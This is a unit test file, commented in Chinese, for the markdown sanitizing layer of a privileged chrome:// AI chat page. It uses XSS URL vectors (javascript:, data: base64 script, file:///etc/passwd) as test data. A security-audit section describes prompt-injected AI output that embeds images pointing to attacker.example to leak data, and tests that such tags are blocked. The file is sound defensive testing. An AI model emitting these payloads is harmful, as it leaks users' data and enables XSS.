// 单测 — src/chat/lib/markdown.ts（渲染安全层，node:test，无框架）
// 覆盖：fail-closed、URL 安全判定、target 剥离 hook、链接点击拦截、marked 管线
// 环境注：Node 无 DOM，真实 DOMPurify 消毒在页面侧验证（依赖冻结装不了 jsdom）；
// 这里验证我们自己的安全逻辑（hook / URL 守卫 / 拦截 / fail-closed）。
import { test } from "node:test";
import assert from "node:assert/strict";
import {
  CHAT_SANITIZE_CONFIG,
  isSafeExternalUrl,
  stripAnchorTargetHook,
  handleContentClick,
  renderMarkdown,
  parseMarkdownUnsafe,
  setSanitizer,
  escapeHtml,
} from "../../src/chat/lib/markdown.ts";

// ---- fail-closed：未初始化 sanitizer 绝不放行 ----

test("renderMarkdown 未初始化 sanitizer → 抛错（fail-closed，不放行未消毒 HTML）", () => {
  setSanitizer(null);
  assert.throws(
    () => renderMarkdown("<script>alert(1)</script>"),
    /sanitizer not initialized/,
  );
});

test("parseMarkdownUnsafe 原样保留 raw HTML —— 证明消毒步骤不可省略", () => {
  const out = parseMarkdownUnsafe("<script>alert(1)</script>");
  assert.ok(out.includes("<script>alert(1)</script>"));
});

test("renderMarkdown 注入 sanitizer 后走完整管线", () => {
  setSanitizer((html) => `[sanitized]${html}`);
  const out = renderMarkdown("# hi");
  assert.ok(out.startsWith("[sanitized]"));
  assert.ok(out.includes("<h1"));
  setSanitizer(null);
});

// ---- isSafeExternalUrl（openExternal 前置过滤 + hook 共用）----

test("url: https/http 绝对 URL 放行", () => {
  assert.equal(isSafeExternalUrl("https://example.com/a?b=1"), true);
  assert.equal(isSafeExternalUrl("http://example.com"), true);
});

test("url: XSS 协议向量全拒", () => {
  assert.equal(isSafeExternalUrl("javascript:alert(1)"), false);
  assert.equal(isSafeExternalUrl("JAVASCRIPT:alert(1)"), false); // 大小写
  assert.equal(isSafeExternalUrl("java\tscript:alert(1)"), false);
  assert.equal(isSafeExternalUrl("data:text/html;base64,PHNjcmlwdD4="), false);
  assert.equal(isSafeExternalUrl("vbscript:msgbox(1)"), false);
  assert.equal(isSafeExternalUrl("file:///etc/passwd"), false);
  assert.equal(isSafeExternalUrl("chrome://settings"), false);
});

test("url: 相对路径与非法串不放行（openExternal 契约只收绝对 http/s）", () => {
  assert.equal(isSafeExternalUrl("foo/bar"), false);
  assert.equal(isSafeExternalUrl("//evil.example.com/x"), false);
  assert.equal(isSafeExternalUrl(""), false);
  assert.equal(isSafeExternalUrl(" javascript:alert(1)"), false);
});

// ---- stripAnchorTargetHook（DOMPurify afterSanitizeAttributes hook 本体）----

function fakeAnchor(attrs) {
  const map = new Map(Object.entries(attrs));
  const anchor = {
    tagName: "A",
    removed: [],
    // 与真实 DOM 一致：closest 命中自身
    closest: (sel) => (sel === "a" ? anchor : null),
    getAttribute: (k) => (map.has(k) ? map.get(k) : null),
    removeAttribute(k) {
      map.delete(k);
      this.removed.push(k);
    },
    _attrs: map,
  };
  return anchor;
}

test("hook: <a target=_blank> → target 被剥离，href 保留", () => {
  const a = fakeAnchor({ target: "_blank", href: "https://example.com" });
  stripAnchorTargetHook(a);
  assert.deepEqual(a.removed, ["target"]);
  assert.equal(a._attrs.get("href"), "https://example.com");
});

test("hook: href 为 javascript: → href 整条剥除（链接变纯文本，不可触发导航）", () => {
  const a = fakeAnchor({ href: "javascript:alert(1)" });
  stripAnchorTargetHook(a);
  assert.ok(a.removed.includes("href"));
});

test("hook: 非 a 元素不动", () => {
  const el = {
    tagName: "IMG",
    removed: [],
    getAttribute: () => null,
    removeAttribute(k) {
      this.removed.push(k);
    },
  };
  stripAnchorTargetHook(el);
  assert.deepEqual(el.removed, []);
});

// ---- handleContentClick（§4.7 capture 链接拦截，纯逻辑）----

function fakeEvent(target) {
  return {
    target,
    prevented: false,
    stopped: false,
    preventDefault() {
      this.prevented = true;
    },
    stopPropagation() {
      this.stopped = true;
    },
  };
}

test("click: 渲染产物内 https 链接 → preventDefault + 返回 URL（经桥外发）", () => {
  const a = fakeAnchor({ href: "https://example.com/paper" });
  const evt = fakeEvent(a);
  const url = handleContentClick(evt);
  assert.equal(url, "https://example.com/paper");
  assert.equal(evt.prevented, true);
  assert.equal(evt.stopped, true);
});

test("click: 链接嵌在 markdown 产物深处 → closest 命中", () => {
  const a = fakeAnchor({ href: "https://example.com" });
  const evt = fakeEvent({ closest: (sel) => (sel === "a" ? a : null) });
  assert.equal(handleContentClick(evt), "https://example.com");
  assert.equal(evt.prevented, true);
});

test("click: javascript: 链接 → 仍被拦截（preventDefault）但不外发（返回 null）", () => {
  const a = fakeAnchor({ href: "javascript:alert(1)" });
  const evt = fakeEvent(a);
  assert.equal(handleContentClick(evt), null);
  assert.equal(evt.prevented, true);
});

test("click: 非链接区域 → 不拦截不外发", () => {
  const evt = fakeEvent({ closest: () => null });
  assert.equal(handleContentClick(evt), null);
  assert.equal(evt.prevented, false);
});

test("click: 无 href 的 a（如已剥除的坏链）→ 拦截但不外发", () => {
  const a = fakeAnchor({});
  const evt = fakeEvent(a);
  assert.equal(handleContentClick(evt), null);
  assert.equal(evt.prevented, true);
});

// ---- 基础渲染（marked 管线本身）----

test("markdown: 代码块带 hljs 语言类，未知语言回落转义", () => {
  const withLang = parseMarkdownUnsafe("```python\nprint('x')\n```");
  assert.ok(withLang.includes('class="hljs language-python"'));
  assert.ok(withLang.includes("<span"));
  const unknown = parseMarkdownUnsafe("```notalang\n<b>&\n```");
  assert.ok(unknown.includes("&lt;b&gt;&amp;"));
});

test("escapeHtml 覆盖五个危险字符", () => {
  assert.equal(
    escapeHtml(`<a href="x">&'`),
    "&lt;a href=&quot;x&quot;&gt;&amp;&#39;",
  );
});

// ---- 安全审计 重要 4：AI 输出的远程图片/媒体不得在无点击时自动外发 ----
//
// 攻击面：本页是 chrome:// 特权页面，AI 输出受提示词注入影响，`![](https://attacker/?d=…)`
// 或裸 `<img src=…>` 都会让页面在渲染瞬间自动请求外部地址（静默打点/数据外发）。
// 防线在 markdown.ts 的 CHAT_SANITIZE_CONFIG（白名单制，DOMPurify 在页面侧据此剥元素）——
// 节点测试无 DOM、跑不了真实 DOMPurify，这里锁住两件事：载体确实由 marked 产出、白名单确实拒它。

test("安全: 图片注入的两种形态（markdown 语法 / 裸 HTML）都产出 img 元素——白名单里没有 img", () => {
  const viaMarkdown = parseMarkdownUnsafe(
    "![图](https://attacker.example/?d=secret)",
  );
  const viaRawHtml = parseMarkdownUnsafe(
    '<img src="https://attacker.example/?d=secret" alt="图">',
  );
  // 前置条件：两种形态都真的落成 img（否则本用例是假绿）
  assert.ok(viaMarkdown.includes("<img"), "markdown 图片语法未产出 img");
  assert.ok(viaMarkdown.includes("https://attacker.example/?d=secret"));
  assert.ok(viaRawHtml.includes("<img"), "裸 <img> 未被 marked 原样带过");
  // 防线：img 不在聊天白名单 → DOMPurify 渲染层剥除，页面不发请求
  assert.ok(
    !CHAT_SANITIZE_CONFIG.ALLOWED_TAGS.includes("img"),
    "img 回到聊天白名单（远程图片会无点击自动外发）",
  );
});

test("安全: 一切可自动发起请求的元素/属性都不在聊天白名单（含 src/srcset/style 等）", () => {
  const fetchableTags = [
    "img",
    "picture",
    "source",
    "video",
    "audio",
    "iframe",
    "object",
    "embed",
    "form",
    "input",
    "button",
    "style",
    "link",
    "svg",
    "math",
    "base",
    "meta",
  ];
  for (const tag of fetchableTags) {
    assert.ok(
      !CHAT_SANITIZE_CONFIG.ALLOWED_TAGS.includes(tag),
      `${tag} 可无点击发起外部请求，不该在聊天白名单`,
    );
  }
  const fetchableAttrs = [
    "src",
    "srcset",
    "poster",
    "background",
    "style",
    "action",
    "formaction",
    "ping",
  ];
  for (const attr of fetchableAttrs) {
    assert.ok(
      !CHAT_SANITIZE_CONFIG.ALLOWED_ATTR.includes(attr),
      `${attr} 可触发外部请求/导航，不该在聊天白名单`,
    );
  }
});

test("安全: markdown 常用产物与 hljs 高亮仍在白名单（收白名单不得把正文渲染删残）", () => {
  for (const tag of [
    "p",
    "h1",
    "ul",
    "ol",
    "li",
    "blockquote",
    "pre",
    "code",
    "strong",
    "em",
    "a",
    "hr",
    "br",
    "table",
    "thead",
    "tbody",
    "tr",
    "th",
    "td",
    "span",
  ]) {
    assert.ok(
      CHAT_SANITIZE_CONFIG.ALLOWED_TAGS.includes(tag),
      `${tag} 缺失：markdown 渲染会被删残`,
    );
  }
  for (const attr of ["href", "class", "start", "align", "colspan"]) {
    assert.ok(
      CHAT_SANITIZE_CONFIG.ALLOWED_ATTR.includes(attr),
      `${attr} 缺失：链接/高亮/表格渲染会退化`,
    );
  }
});
